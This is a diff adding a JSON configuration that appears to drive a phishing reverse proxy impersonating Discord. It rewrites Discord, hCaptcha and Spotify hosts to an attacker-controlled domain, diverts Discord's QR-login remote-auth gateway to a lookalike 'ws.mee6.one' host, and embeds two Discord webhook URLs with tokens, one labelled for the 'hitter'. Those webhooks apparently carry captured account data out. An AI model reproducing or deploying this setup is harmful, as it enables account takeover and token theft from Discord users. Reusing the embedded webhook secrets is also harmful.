@@ -1,0 +1,131 @@
+{
+    "port": 2222,
+    "webhook": "https://discordapp.com/api/webhooks/1047733670787678228/jDFcOIuAaT8m-Y4_fIi2U4EOeyN0FbpIcGCLuwYlIOkklLf3OY63v25gqVDruYbjY77K",
+    "hitter_webhook": "https://discordapp.com/api/webhooks/1047733370370670592/64IX12Yqy7MR83xH7JBrfxKh6Dc9AtqlYQHqpxV46wLsvny8TlEVME6ZRIsUvodGgcoV",
+
+    "paths": [
+        {
+            "path": "/cdn/",
+            "url": "https://cdn.discordapp.com"
+        }, {
+           "path": "/media/",
+           "url": "https://media.discordapp.net" 
+        }, {
+            "path": "/captcha/",
+            "url": "https://hcaptcha.com"
+        }, {
+            "path": "/assets-global/",
+            "url": "https://assets-global.website-files.com"
+        }, {
+            "path": "/localizecdn/",
+            "url": "https://global.localizecdn.com"
+        }, {
+            "path": "/website-files/",
+            "url": "https://assets.website-files.com"
+        }, {
+            "path": "/spotify-api/",
+            "url": "https://api.spotify.com"
+        }, {
+            "path": "/scdn/",
+            "url": "https://i.scdn.co"
+        }, {
+            "path": "/ext/",
+            "url": "https://images-ext-1.discordapp.net"
+        }, {
+            "path": "/discord-attachments-uploads/",
+            "url": "https://discord-attachments-uploads-prd.storage.googleapis.com"
+        }
+    ],
+
+    "subdomains": [
+        {
+            "subdomain": "example",
+            "url": "https://example.example.com"
+        }
+    ],
+
+    "filter": [
+        {
+            "pattern": "discord.com",
+            "replacement": "<DOMAIN>"
+        }, {
+            "pattern": "cdn.discordapp.com",
+            "replacement": "<DOMAIN>/cdn"
+        }, {
+            "pattern": "hcaptcha.com",
+            "replacement": "<DOMAIN>/captcha"
+        }, {
+            "pattern": "assets-global.website-files.com",
+            "replacement": "<DOMAIN>/assets-global"
+        }, {
+            "pattern": "global.localizecdn.com",
+            "replacement": "<DOMAIN>/localizecdn"
+        }, {
+            "pattern": "assets.website-files.com",
+            "replacement": "<DOMAIN>/website-files"
+        }, {
+            "pattern": "media.discordapp.net",
+            "replacement": "<DOMAIN>/media"
+        }, {
+            "pattern": "api.spotify.com",
+            "replacement": "<DOMAIN>/spotify-api"
+        }, {
+            "pattern": "i.scdn.co",
+            "replacement": "<DOMAIN>/scdn"
+        }, {
+            "pattern": "images-ext-1.discordapp.net",
+            "replacement": "<DOMAIN>/ext"
+        }, {
+            "pattern": "https/<DOMAIN>/cdn",
+            "replacement": "https/cdn.discordapp.com"
+        }, {
+            "pattern": "https/<DOMAIN>/media",
+            "replacement": "https/media.discordapp.net"
+        }, {
+            "pattern": "discord-attachments-uploads-prd.storage.googleapis.com",
+            "replacement": "<DOMAIN>/discord-attachments-uploads"
+        }, {
+            "pattern": "remote-auth-gateway.discord.gg",
+            "replacement": "ws.mee6.one"
+        }, {
+            "pattern": "<DOMAIN>/ra/",
+            "replacement": "discordapp.com/ra/"
+        }
+    ],
+
+    "whitelisted_extensions": [
+        "webp",
+        "jpeg",
+        "png",
+        "woff",
+        "ogg",
+        "svg",
+        "mp4",
+        "mp3",
+        "woff2",
+        "wasm",
+        "ico",
+        "webm"
+    ],
+
+    "whitelisted_content": [
+        "image/png",
+        "image/jpeg",
+        "image/webp",
+        "application/x-debian-package",
+        "application/x-tar",
+        "text/plain",
+        "application/wasm",
+        "application/x-msdownload"
+    ],
+
+    "whitelisted_urls": [
+        "hcaptcha.com",
+        "cdn.discordapp.com"
+    ],
+
+    "status": [
+        204,
+        304
+    ]
+}
